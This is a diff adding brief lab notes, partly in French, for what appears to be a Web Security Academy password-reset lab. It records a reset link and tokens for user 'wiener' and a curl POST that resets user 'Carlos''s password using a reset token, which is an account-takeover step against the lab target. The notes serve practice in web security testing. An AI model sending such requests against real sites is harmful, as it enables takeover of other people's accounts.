@@ -1,0 +1,13 @@
+Link generated to wiener :
+https://0a0e00e504ed646b80080dfa008a00d1.web-security-academy.net/forgot-password?temp-forgot-password-token=2303pteolevunna80260ticx1wqoh4oa
+
+Token : 2303pteolevunna80260ticx1wqoh4oa
+Other Token : ix76d2bjeyuu2f7hvww7kd2nc7c29ul1
+
+Requete Curl sur Token valide
+curl -X POST "
+https://0a0e00e504ed646b80080dfa008a00d1.web-security-academy.net/forgot-password?temp-forgot-password-token=ro3vyi79jfvafqhd8k05ylc3e3lhw4s8q" \
+  -F "username=Carlos" \
+  -F "new-password-1=motdepasse" \
+  -F "new-password-2=motdepasse" \
+  -F "temp-forgot-password-token=ro3vyi79jfvafqhd8k05ylc3e3lhw4s8"
